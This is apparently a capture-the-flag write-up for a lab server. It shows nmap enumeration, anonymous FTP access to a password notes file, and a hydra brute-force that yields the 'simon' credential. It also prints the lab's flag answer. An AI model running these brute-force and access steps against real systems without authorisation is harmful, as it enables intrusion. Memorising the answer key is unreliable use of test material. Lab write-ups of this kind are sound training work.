# MEDIUM
The second server is an internal server (within the inlanefreight.htb domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.

> Task: Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.. **Answer: HTB{1qay2wsx3EDC4rfv_M3D1UM}**

1. Enumerate the target with full port scan:
    ```sh
    $ nmap -Pn -sV -p- 10.129.36.136
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-11 03:07 CST
    Nmap scan report for 10.129.36.136
    Host is up (0.24s latency).
    Not shown: 995 closed tcp ports (reset)
    PORT     STATE SERVICE  VERSION
    22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
    110/tcp  open  pop3     Dovecot pop3d
    995/tcp  open  ssl/pop3 Dovecot pop3d
    2121/tcp open  ftp
    30021/tcp open  ftp
    ```

2. Tries login as anonymous to the FTP service at port 30021 and found interesting notes:
    ```sh
    $ ftp 10.129.36.136 30021
    Connected to 10.129.36.136.
    220 ProFTPD Server (Internal FTP) [10.129.36.136]
    Name (10.129.36.136:root): anonymous
    331 Anonymous login ok, send your complete email address as your password
    Password: 
    230 Anonymous access granted, restrictions apply
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls
    229 Entering Extended Passive Mode (|||36933|)
    150 Opening ASCII mode data connection for file list
    drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
    226 Transfer complete
    ftp> cd simon
    250 CWD command successful
    ftp> ls
    229 Entering Extended Passive Mode (|||2592|)
    150 Opening ASCII mode data connection for file list
    -rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
    226 Transfer complete
    ftp> get mynotes.txt
    local: mynotes.txt remote: mynotes.txt
    ```

3. This note might be the passwords for the `simon` account:
    ```sh
    $ cat mynotes.txt 
    234987123948729384293
    +23358093845098
    ThatsMyBigDog
    Rock!ng#May
    Puuuuuh7823328
    8Ns8j1b!23hs4921smHzwn
    237oHs71ohls18H127!!9skaP
    238u1xjn1923nZGSb261Bs81
    ```

4. Brute-force the `simon` account with the retrieved password list and retrieve credential for the FTP service at port 2121 (`simon:8Ns8j1b!23hs4921smHzwn`):
    ```sh
    $ hydra -l simon -P mynotes.txt -s 2121 ftp://10.129.36.136
    Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-11 03:59:07
    [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
    [DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
    [DATA] attacking ftp://10.129.36.136:2121/
    [2121][ftp] host: 10.129.36.136   login: simon   password: 8Ns8j1b!23hs4921smHzwn
    1 of 1 target successfully completed, 1 valid password found
    ```

5. Login with the retrieved credential and read the flag:
    ```sh
    $ ftp 10.129.36.136 2121
    Connected to 10.129.36.136.
    220 ProFTPD Server (InlaneFTP) [10.129.36.136]
    Name (10.129.36.136:root): simon
    331 Password required for simon
    Password: 
    230 User simon logged in
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls
    229 Entering Extended Passive Mode (|||36088|)
    150 Opening ASCII mode data connection for file list
    -rw-r--r--   1 root     root           29 Apr 20  2022 flag.txt
    drwxrwxr-x   3 simon    simon        4096 Apr 18  2022 Maildir
    226 Transfer complete
    ftp> more flag.txt
    ```